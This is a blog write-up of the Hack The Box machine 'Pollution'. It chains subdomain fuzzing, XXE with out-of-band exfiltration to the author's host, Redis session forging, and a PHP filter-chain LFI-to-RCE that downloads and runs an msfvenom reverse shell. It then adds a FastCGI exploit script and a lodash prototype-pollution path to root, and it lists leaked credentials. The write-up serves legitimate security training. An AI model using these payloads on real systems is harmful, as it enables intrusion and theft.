---
title: Pollution
date: 2023-03-14
categories: [Blog]
tags: [competitions]     
author: Derrick
TOC: true
---

# Pollution

![](https://i.imgur.com/PrhY1LE.png)

# Overview

Pollution is an awesome and difficult Linux box focusing around an interesting choice for a tech stack. A combination of a PHP site handled with PHP FPM and a NodeJS API says it all. This box had me going through all of my web knowledge in order to fully compromise the machine.
The box begins with fuzzing for subdomains. One of which contains a log with information on gaining a admin account on the initial website. Admins have access to an API endpoint vulnerable to XXE. Chain this with SSRF and you can gain access to local files through out of bands exfiltration. Snoop around and you eventually find the password to the other subdomain and a password to the Redis database. Adjust your own cookie handled by the database to bypass authentication to the third site. Use the LFI to RCE chain to gain our first shell. Exploit FastCGI on port 9000 and we are able to pivot to Victor. For the final stretch of the machine, perform prototype pollution on the API to gain a root shell.

# Reconnaissance

---

## Nmap

```jsx
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:37 EST
Nmap scan report for collect.htb (10.10.11.192)
Host is up (0.077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
```

Initial scans from the outside reveal 2 typical ports seen with nearly any Linux web server: SSH and HTTP. Interestingly enough, this web application uses a Redis database which I don’t often see.

## HTTP Site (80/tcp)

Looks like a custom web application capable of handling registering for an account and logging in. Mentions of an API so we may be abusing that later. Site also seems to have error handling in the form of redirecting back to the main page if attempting to pull a page that does not exist. Visiting admin page redirects as a result of either access controls or routing. Default admin credentials don’t work either.

![](https://i.imgur.com/br2NuGn.png)

### Subdomains

- Command:
    
    `gobuster vhost -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
    

```jsx
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://collect.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.2.0-dev
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/08 13:26:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: forum.collect.htb Status: 200 [Size: 14102]
Found: developers.collect.htb Status: 401 [Size: 469]
===============================================================
2023/03/08 13:37:38 Finished
===============================================================
```

### Directories

- Command:
    
    `gobuster dir -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197`
    

```jsx
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://collect.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] Exclude Length:          26197
[+] User Agent:              gobuster/3.2.0-dev
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2023/03/08 13:51:18 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 4746]
/login                (Status: 200) [Size: 4740]
/admin                (Status: 200) [Size: 4740]
/assets               (Status: 200) [Size: 1500]
/api                  (Status: 200) [Size: 4740]
/home                 (Status: 200) [Size: 4740]
/server-status        (Status: 403) [Size: 276]
===============================================================
2023/03/08 13:56:32 Finished
===============================================================
```

- Note to self while enumerating websites
    
    **Directories:** When attempting to fuzz for directories on a website that redirects a lot, use the `-r` flag in `gobuster` and see where it goes to. Take that content length and exclude it with `--exclude-length` XXX characters.
    
    **Vhosts**: Not sure if this was a one off thing but I’ve been noticing that while debugging vhost fuzzing with `gobuster` they don’t append the rest of the domain. To get around this use the `--append-domain` flag and you will eventually find what you are looking for if it exists.
    

### Developers site

So far, I cannot access this site as it requires basic authentication. We may be able to get through if we can find credentials somewhere.

![](https://i.imgur.com/LOAw9j7.png)

### Forum site

Seems like a site for employees however it was publicly accessible. You can also sign up for an account here. One of the threads contains an interesting log file.

![](https://i.imgur.com/MwnyJ9O.png)

<aside>
❗ Important
token=ddac62a28254561001277727cb397baf

</aside>

This was located inside the attached log file. The token can be used to create admin users at [`http://collect.htb/set/role/admin`](http://collect.htb/set/role/admin). All it needs to take is the PHPSESSID cookie so I can send in a POST request with my account’s cookie in order to turn it into an admin account.

## Redis Database (6379/tcp)

![](https://i.imgur.com/GgJJKiD.png)

By the looks of it, can’t really access this database without valid credentials.

# Initial Access: www-data

---

## Administrator site

Seems like the API being mentioned earlier comes into play here. Here we can register for the API. Intercepting the post request of this form is pretty interesting.

![](https://i.imgur.com/DkIfvPY.png)

API POST Request example

![](https://i.imgur.com/kFnFCTz.png)


Interestingly enough, seems like the API takes in requests in the format of XML.

<aside>
❕ **Information**
The output is in XML which is commonly vulnerable to XXE

</aside>

## XXE → SSRF Out of Bands Exfiltration

<aside>
⚠️ **First off, what is XXE?**
XML External Entity or XXE for short is a type of vulnerability that occurs when an XML parser processes input containing a reference to an external entity hence the name. Generally speaking, XXE is used to disclose local files or at least, that is the extent to which I have been able to use it for in the past.

</aside>

While attempting basic XXE payloads from Hacktricks such as:

```jsx
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

![](https://i.imgur.com/jHoMkkb.png)


All I get is a fat error. This might be because the input I'm providing is a `<data>` tag and that the API is expecting certain data, but no matter how I adjust this or try to append this to a valid request, I only get failures. In retrospect for this type of payload, I believe data needs to be reflected somewhere in order to get the file’s contents to be outputted somewhere. When I get a valid request, all it says is a 200 okay.

Another XXE attack I can try is to chain it with server side request forgery (SSRF). Here’s the new payload I can try:

```jsx
<!ENTITY % file SYSTEM "index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'>">
%eval;
%exfiltrate;
```

This is going to be the contents of evil.dtd which will be requested in this kind of POST request for the manage_api argument.

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.137/evil.dtd"> %xxe;]>
<root>
	<method>POST</method>
	<uri>/auth/register</uri>
	<user>
		<username>lmao</username>
		<password>lmaoao</password>
	</user>
</root>
```

What I am doing here is appending an external entity in `evil.dtd` which is hosted on my end and exfiltrates data back in the form of a get request to my system.

![](https://i.imgur.com/cAoW66V.png)

Upon sending the request, it works! It is indeed vulnerable to XXE! The next issue is that we need to actually exfiltrate meaningful data. We know this is a PHP site since we have the cookie `PHPSESSID` so there is no reason for `index.php` to not be found unless we need to bypass some sort of filter. Well we can try just that with this new payload here. We just need to use a PHP filer instead.

```jsx
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'>">
%eval;
%exfiltrate;
```

![](https://i.imgur.com/okw4qpW.png)


Bingo we get a hit! All we need to do is base64 decode this data and we get the contents of `index.php`.

<aside>
❓ **Wait wait wait, what’s going on?**
Let me try to explain what happened here. I sent in a valid post request utilizing an actual API request from earlier but appended the external entity into it. This is in the line: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.137/evil.dtd"> %xxe;]>`
This calls back to my webserver and loads in a file, `index.php` and sends it to my webserver again through the URL. So that base64 output you are seeing, that’s the `index.php` page encoded and sent straight back to me.

</aside>

### Interesting Files

```php
<?php

require '../bootstrap.php';

use app\classes\Routes;
use app\classes\Uri;

$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```

Lets analyze some of these files. First off we have the index page. Looks like we had some PHP routing in place. The `bootstrap.php` might be interesting. File dependencies tend to yield information. I do also want to point out that there might be a character limit or something preventing the full file to be loaded as if you take a look at the PHP file, there is no ending `?>`.

```php
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```

Would you look at that, credentials for the Redis database from earlier. There is also an `autoload.php` however, upon looking into it, there is nothing interesting there.

<aside>
❕ **Information**
1002:victor
collect.htb	developers.collect.htb	forum.collect.htb

</aside>

This information comes from `/etc/group` and `/etc/hosts` respectively. Most importantly, we have a potential user of interest in Victor. Oddly enough, I didn’t see any users with id 1000 or 1001.

Looking back earlier, we still haven’t really tried the developers site just yet. With file read capabilities, we may be able to find credentials if we are lucky. My best guess is to try to find an `.htaccess` file commonly located within the `/var/www/YOU_DOMAIN/.htaccess` as pointed out by [Digital Ocean](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file).

[How To Use the .htaccess File  | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file)

<video width="100%" controls>
  <source src="/assets/vid/htaccess.mp4" type="video/mp4">
</video>


My suspicions were correct, there is an `.htaccess` file for this domain. The decoded contents only contain `Options -Indexes` which just prevents directory listing and throws a 403 error instead which makes sense as earlier during the fuzzing, that was the error I received. Oddly enough, there is no mention of authentication in this file but it may be a result of being unable to load the full file as we have been seeing earlier. Regardless, its still worth a shot to find a `.htpasswd` file either in this directory or up somewhere apache2 is installed.

![](https://i.imgur.com/nvM7kma.png)

This payload worked and we have the contents of the `.htpasswd` file. The username is `developers_group` and the password can hopefully be cracked using a tool like `john`. I tried Hashcat  however, it wouldn’t take the hash.

- Command
    
    `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
    

<aside>
❕ **Information**
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
→
developers_group:r0cket

</aside>

With the developers site password and the Redis database password, we should have enough information from XXE to move on.

## Developers site

![](https://i.imgur.com/SRI4dBM.png)

New site new login page, again. Reusing any of the creds earlier fails here. I let SQLmap run against this however, nothing was found. I’ll be returning to this site later with either creds or an alternate way to bypass the login page.

Since I can’t get any authentication going, best I can do is retrieve some files.

- `index.php`
    
    ```php
    <?php
    require './bootstrap.php';
    
    if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
        die(header('Location: /login.php'));
    }
    
    if (!isset($_GET['page']) or empty($_GET['page'])) {
        die(header('Location: /?page=home'));
    }
    
    $view = 1;
    
    ?>
    
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="assets/js/tailwind.js"></script>
        <title>Developers Collect</title>
    </head>
    
    <body>
        <div class="flex flex-col h-screen justify-between">
            <?php include("header.php"); ?>
            
            <main class="mb-auto mx-24">
                <?php include($_GET['page'] . ".php"); ?>
            </main>
    
            <?php include("footer.php"); ?>
        </div>
    
    </body>
    
    </html>
    ```
    

<aside>
❕ **Information**
——————————————————————————
if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
    die(header('Location: /login.php'));
}
——————————————————————————
This section in the `index.php` sticks out to me. We’ll revisit this later.

</aside>

## Redis Database

- **Quick Redis Cheat Sheet**
    
    `PING`: Responds with PONG if you are authenticated
    
    `INFO KEYSPACE`: Information regarding keys
    
    `KEYS *`: Shows all keys
    
    `GET <KEY>`: Outputs the information stored in the key
    
    `SET <KEY>`: Change key value
    

*First time using a Redis database, I used mainly these commands*

![Database keys](https://i.imgur.com/SE1htwn.png)


Credentials are valid and here we were able to spill some information. Those 2 keys that popped up are my `PHPSESSID` values. the one with `8sod` was the one I’ve been using for the main site and the `mrr3` is the new session ID I got for the dev site.


![Key contents](https://i.imgur.com/DaX24bb.png)


As we can see, these are the key contents of the associated `PHPSESSID` values. If anyone isn’t familiar with this layout, this is just a serialized PHP string.

<aside>
❓ **What’s a PHPSESSID and why is this important?**
A `PHPSESSID` is a cookie commonly given out most if not all PHP sites. These are session identifiers that correspond with a actual data on the back end that stores information such as your username or even an email associated with your account. Note that this value is just an identifier— an arbitrary value. In this Redis database however, we are able to see the values of the cookie and even manipulate meaning we can create our own cookie with its own set values.

</aside>

<aside>
⚠️ **How can we abuse this?**
Well, if we can sign cookies with any value, it would be possible to spin up a “session” for an account that doesn’t exist and possibly even bypass authentication such as the one seen on the `/login.php` of the developers site.

</aside>

## Revisiting Developers Subdomain

### Bypassing Authentication

The information in our admin cookie is as follows: `"username|s:4:\"bruh\";role|s:5:\"admin\";"`
Currently, the cookie we have for the dev site is empty. Looking back onto the `index.php`, we see that the session cookie needs to contain an “auth” value and set to be “True” in order to gain access to the site. We can set our cookie in the Redis database and refresh our page to get through. Take a look at this demo:

<video width="100%" controls>
  <source src="/assets/vid/php.mp4" type="video/mp4">
</video>

![The index of the dev site](https://i.imgur.com/J3L0385.png)


Looks like we are in! Every page here seems to be static but there is one key thing to take note of here.

### PHP LFI → RCE Chain

![URL of the site](https://i.imgur.com/qBGMwhr.png)

URL of the site

<aside>
❕ **Information**
Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.
</aside>

Initial tests with standard LFI payloads is not displaying anything but since this is a PHP site, I jumped the gun and went straight for the chain. There is a nice [tool](https://github.com/synacktiv/php_filter_chain_generator) that can generate chains for us and this was the the command I used:

- Command
    
    `python3 [lfi.py](http://lfi.py/) --chain '<?php system("whoami"); ?>'`
    

[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

![](https://i.imgur.com/atuZhIH.png)


Look at that! We have command execution! Unless there is a firewall in our way, shell is just across the horizon.

![](https://i.imgur.com/29F0Wyz.png)


We have a road block. The command chains I am passing through are becoming too long for the server to handle. Attempting to run a bash reverse shell contains too many characters. Even something like this is too long when chained: `<?php system("wget [http://10.10.14.152/a](http://10.10.14.152/a)"); ?>`

We need to find a way to shorten this code to allow myself to upload a shell. Apparently in PHP, as I was just taught from ChatGPT, `system` commands can be shorted by using ``` instead. The `<?php` can also be shortened with `<?=` to save 2 characters. You can also remove the `http://` in the wget request.

With this chain of commands, I was able to get RCE:

- Create msfvenom payload
    
    `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f elf > a`
    
- Drop payload on disk
    
    `python3 [lfi.py](http://lfi.py/) --chain '<?= `wget 10.10.14.152/a -O /tmp/a`; ?>'`
    
- Change permissions
    
    `python3 [lfi.py](http://lfi.py/) --chain '<?= `chmod 777 /tmp/a`; ?>'`
    
- Activate
    
    `python3 [lfi.py](http://lfi.py/) --chain '<?= `/tmp/a`; ?>'`
    

With all that, we finally have access to the network :)  

# Pivot: www-data → Victor

---

## Basic Enumeration

![list files output](https://i.imgur.com/5dOuQ1K.png)


Interestingly enough, despite our file read through XXE earlier, we couldn’t read `login.php` despite it existing. Here is the interesting part of it though:

```php
$db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers");
$db->set_charset('utf8mb4');
```

<aside>
❕ **Information**
We have plaintext credentials!!
webapp_user:Str0ngP4ssw0rdB*12@1

</aside>

Credentials obtained and noted. Next up is where to use them.

![List listening ports](https://i.imgur.com/r1bVzIB.png)


`netstat -tulpn` shows us quite a bit of information on this box actually. 3306 is expected as we have database credentials so I’ll be enumerating that shortly. There is also a port 9000 which I never seen before as well as 3000 which might be either Werkzeug, GitTea, a proxy of some sort, or something else.

### MariaDB (3306/tcp)

```jsx
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.001 sec)
```

MariaDB seems to house many databases. Many of which seem to belong to the various domains on the machine. Developers contains an admin user whos password hash remained uncrackable. Forum contains password hashes and salts for Victor, the user of interest, among many others yet none were crackable either. Webapp was the main site. pollution_api seems pretty empty with empty users and empty messages. Though considering the box name, we may be revisiting this later.

### ExpressJS API (3000/tcp)

This port happened to just be a API handler. I looked back into the source code of some of the pages we used earlier like `bootstrap.php` and it mentioned curling requests to port 3000. I guess this is where that comes into play. As of right now we can’t really do much. It requires authentication to play with its functionality and there’s no leads there.

### FastCGI (9000/tcp)

First time seeing this port open. Hacktricks seems to have an article on this port so I will be testing that out shortly. I also found that by running linpeas under the cleaned processes tab, I saw this:

```php
victor      1113  0.0  0.3 265840 15836 ?        S    Mar10   0:00  _ php-fpm: pool victor                                                                      
victor      1114  0.0  0.3 265840 15836 ?        S    Mar10   0:00  _ php-fpm: pool victor
```

php-fpm is FastCGI Process Manager so this should confirm what the port 9000 is. That being said, time to test the Hacktricks payloads.

[9000 - Pentesting FastCGI](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)

This was the payload I ended up using. No need to create a long reverse shell payload if I know this is run as Victor. I can just reuse the payload I dropped earlier.

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('/tmp/a'); echo '-->';"
FILENAMES="/var/www/developers/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

After running this bash script, we are in as Victor.

# Privesc: Victor → Root

---

## Basic Enumeration

![](https://i.imgur.com/5DEvyhD.png)

Seems like Victor is the owner of the pollution_api. I guess this is the API that they have been advertising on their main site.

![Revisiting the forum post](https://i.imgur.com/woemSw7.png)

It’s pretty neat to see that this was hinted at so early into the box. The premise for the box is fairly consistent.

Revisiting the line earlier spit out by linpeas strikes me as interesting:

```bash
root    1364  0.0  1.8 1663556 75120  /usr/bin/node /root/pollution_api/index.js
```

Although the process is run as root, it’s Victor, our current user, who is the owner of the file. Regardless, lets take a look at the API’s source code.

- `routes/documentation.js`
    
    ```bash
    const express = require('express');
    const router = express.Router();
    
    router.get('/',(req,res)=>{
        res.json({
            Documentation: {
                Routes: {
                    "/": {
                        Methods: "GET",
                        Params: null
                    },
                    "/auth/register": {
                        Methods: "POST",
                        Params: {
                            username: "user",
                            password: "pass"
                        }
                    },
                    "/auth/login": {
                        Methods: "POST",
                        Params: {
                            username: "user",
                            password: "pass"
                        }
                    },
                    "/client": {
                        Methods: "GET",
                        Params: null
                    },
                    "/admin/messages": {
                        Methods: "POST",
                        Params: {
                            id: "messageid"
                        }
                    },
                    "/admin/messages/send": {
                        Methods: "POST",
                        Params: {
                            text: "message text"
                        }
                    }
                }
            }
    ```
    
- `functions/jwt.js`
    
    ```bash
    const jwt = require('jsonwebtoken');
    const SECRET = "JWT_COLLECT_124_SECRET_KEY"
    
    const signtoken = (payload)=>{
        const token = jwt.sign(payload, SECRET, { expiresIn: 3600 });
        return token;
    }
    
    const decodejwt = (token)=>{
        return jwt.verify(token, SECRET, (err, decoded)=>{
            if(err) return false;
            return decoded;
        });
    }
    
    module.exports = { signtoken, decodejwt};
    ```
    
- `routes/auth.js`
    
    ```bash
    const express = require('express');
    const router = express.Router();
    const User = require('../models/User');
    const { decodejwt } = require('../functions/jwt')
    
    //controllers
    const { messages } = require('../controllers/Messages');
    const { messages_send } = require('../controllers/Messages_send');
    
    router.use('/', async(req,res,next)=>{
        if(req.headers["x-access-token"]){
            const token = decodejwt(req.headers["x-access-token"]);
            if(token){
                const find = await User.findAll({where: {username: token.user, role: token.role}});           
                if(find.length > 0){
                    if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
                        return next();
                    }
                    return res.json({Status: "Error", Message: "You are not allowed"});
                }
                return res.json({Status: "Error", Message: "You are not allowed"});
            }
            return res.json({Status: "Error", Message: "You are not allowed"});
        }
        return res.json({Status: "Error", Message: "You are not allowed"});
    })
    
    router.get('/',(req,res)=>{
        res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
    })
    
    router.post('/messages',messages);
    router.post('/messages/send', messages_send);
    module.exports = router;
    ```
    
- `routes/admin.js`
    
    ```jsx
    const express = require('express');
    const router = express.Router();
    const User = require('../models/User');
    const { decodejwt } = require('../functions/jwt')
    
    //controllers
    
    const { messages } = require('../controllers/Messages');
    const { messages_send } = require('../controllers/Messages_send');
    
    router.use('/', async(req,res,next)=>{
        if(req.headers["x-access-token"]){
    
            const token = decodejwt(req.headers["x-access-token"]);
            if(token){
                const find = await User.findAll({where: {username: token.user, role: token.role}});
                
                if(find.length > 0){
    
                    if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
    
                        return next();
    
                    }
    
                    return res.json({Status: "Error", Message: "You are not allowed"});
                }
    
                return res.json({Status: "Error", Message: "You are not allowed"});
            }
    
            return res.json({Status: "Error", Message: "You are not allowed"});
        }
    
        return res.json({Status: "Error", Message: "You are not allowed"});
    })
    
    router.get('/',(req,res)=>{
        res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
    })
    
    router.post('/messages',messages);
    router.post('/messages/send', messages_send);
    
    module.exports = router;
    ```
    
- `controllers/Send_messages.js`
    
    ```bash
    const Message = require('../models/Message');
    const { decodejwt } = require('../functions/jwt');
    const _ = require('lodash');
    const { exec } = require('child_process');
    
    const messages_send = async(req,res)=>{
        const token = decodejwt(req.headers['x-access-token'])
        if(req.body.text){
            const message = {
                user_sent: token.user,
                title: "Message for admins",
            };
    
            _.merge(message, req.body);
    
            exec('/home/victor/pollution_api/log.sh log_message');
    
            Message.create({
                text: JSON.stringify(message),
                user_sent: token.user
            });
            return res.json({Status: "Ok"});
        }
        return res.json({Status: "Error", Message: "Parameter text not found"});
    }
    
    module.exports = { messages_send };
    ```
    

Alright that’s a lot of files listed, but let me save you from the pain I suffered from staring between these JavaScript files for a couple hours.

<aside>
❕ **Information**
We have a JWT secret!!
const SECRET = "JWT_COLLECT_124_SECRET_KEY"

</aside>

This will allow us to sign ourselves a cookie if necessary.

```jsx
const token = decodejwt(req.headers["x-access-token"]);
	if(token){
		const find = await User.findAll({where: {username: token.user, role: token.role}});           
			if(find.length > 0){
			    if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
			        return next();
		    }
```

It looks like we need an admin role in order to access some parts of the API and set that within a request header named “x-access-token”.

```jsx
const { exec } = require('child_process');
...
		_.merge(message, req.body);
		exec('/home/victor/pollution_api/log.sh log_message');
```

<aside>
❓ **What so important about this excerpt?**
After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.

</aside>

<aside>
⚠️ **How can we abuse all of this?**
Well, our attack chain is going to be quite an interesting one but here is the attack plan all laid out. First we need to go into MariaDB and create a user with admin privileges. The db user is in charge of the web application in general so we should have write access. After creating our user, we need to login so that we can obtain a JWT for authentication. Pass in the JWT to allow us to make requests to the `/admin/messages/send` endpoint. Reason being that this is vulnerable to prototype pollution. Since this is run as root, we most likely will be gaining a root shell if all this is done properly.

</aside>

## Requesting Authentication

First create user in MariaDB

- Command
    
    `INSERT INTO users (username, password, role, createdAt, updatedAt) VALUES ('admin', 'password123', 'admin', NOW(), NOW());`
    

![](https://i.imgur.com/k7YnvOB.png)

Ignore the first user, that was me testing the registration endpoint mentioned in the documentation. But now that we have a valid admin we can login as, we can request a authentication cookie after logging in.

*Note that I used chisel to port forward traffic from 3000 to my 3000.*

- Command
    
    `curl localhost:3000/auth/login -X POST -d '{"username": "admin", "password": "password123"}' -H "Content-Type: application/json"`
    

```jsx
Status	:	Ok
	Header		{1}
  x-access-token	:	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2Nzg2OTQzMjAsImV4cCI6MTY3ODY5NzkyMH0.ibw-iaP8Ca-uHOvQvLDpABGUWpcirqNoUKAUlOgmjvQ
```

Now we have a JWT we can pass in. It’s only valid for 1 hour so we shouldn’t stop here.

## Prototype Pollution → RCE

With our JWT, we can begin making requests to the `/admin` endpoint that was not accessible earlier. (Although I didn’t show that it was inaccessible without the cookie, you’re just going to have to take my word for it). As mentioned earlier, those few lines in the `Send_messages.js` are vulnerable to prototype pollution.

<aside>
❓ **What is prototype pollution?**
Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the [PortSwigger](https://portswigger.net/web-security/prototype-pollution) article a read.

</aside>

[What is prototype pollution? | Web Security Academy](https://portswigger.net/web-security/prototype-pollution)

```jsx
  if(req.body.text){
      const message = {
          user_sent: token.user,
          title: "Message for admins",
      };

      _.merge(message, req.body);

      exec('/home/victor/pollution_api/log.sh log_message');

      Message.create({
          text: JSON.stringify(message),
          user_sent: token.user
      });
```

Back to the vulnerable code, if we send in something like `{"text": '{"__proto__": {"shell": "/path/to/executable"}}'}` , we can get RCE.

<aside>
⚠️ **Explanation**
Here, the **`__proto__`** property is set to an object that has a **`shell`** property with a value of the executable path. By doing this, the attacker has modified the prototype of the merged object, allowing them to add arbitrary properties or methods to the object.

Later in the code, the **`exec()`** function is called with a shell command that uses the **`log.sh`** script to log a message. Since the attacker has modified the prototype of the merged object, the **`exec()`** function will search for the **`shell`** property in the object's prototype chain and find it there. This will cause the shell command to execute the attacker's specified executable path, which is a security vulnerability.

</aside>

That being said, I can just reuse my payload I dropped earlier to gain shell as root since we know this API is being executed as root.